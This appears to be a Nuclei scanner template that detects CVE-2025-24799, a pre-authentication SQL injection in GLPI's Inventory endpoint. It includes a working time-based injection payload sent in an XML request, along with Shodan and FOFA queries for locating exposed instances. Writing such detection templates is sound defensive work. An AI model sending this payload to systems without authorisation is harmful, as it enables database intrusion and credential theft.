http:
- matchers:
  - condition: and
    dsl:
    - duration>=7
    - status_code ==200
    - contains(header, "application/xml")
    - contains_all(body, "<status>ok", "REPLY>")
    type: dsl
  raw:
  - "POST /index.php/ajax/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\
    \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <xml>\n    <QUERY>get_params</QUERY>\n\
    \    <deviceid>', IF((1=1),(select sleep(7)),1), 0, 0, 0, 0, 0, 0);#</deviceid>\n\
    \    <content>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</content>\n</xml>\n"
id: CVE-2025-24799
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2025-24799
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.98332
    epss-score: 0.63756
  description: 'A pre-authentication SQL injection vulnerability exists in the Inventory
    feature of GLPI. The vulnerability is caused by insufficient sanitization of user
    input in the handleAgent function when processing XML requests. The issue occurs
    because SimpleXMLElement objects can bypass the dbEscapeRecursive function, allowing
    an attacker to inject SQL queries. This can lead to unauthorized access to sensitive
    information in the database, including user credentials and potential authentication
    bypass.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL queries through XML
    requests to the Inventory feature, potentially extracting user credentials, bypassing
    authentication, and accessing sensitive database information.

    '
  metadata:
    fofa-query: title="GLPI"
    max-request: 1
    product: GLPI
    shodan-query: title:"GLPI"
    verified: true
  name: GLPI < 10.0.17 - Pre-Auth SQL Injection
  reference:
  - https://blog.lexfo.fr/glpi-sql-to-rce.html
  - https://github.com/glpi-project/glpi/security/advisories/GHSA-p626-hph9-p6fj
  - https://nvd.nist.gov/vuln/detail/CVE-2025-24799
  remediation: 'Upgrade to GLPI version 10.0.18 or later. If upgrading is not immediately
    possible, consider disabling the Inventory feature or restricting access to it.

    '
  severity: critical
  tags: cve,cve2025,glpi,sqli,vkev,vuln
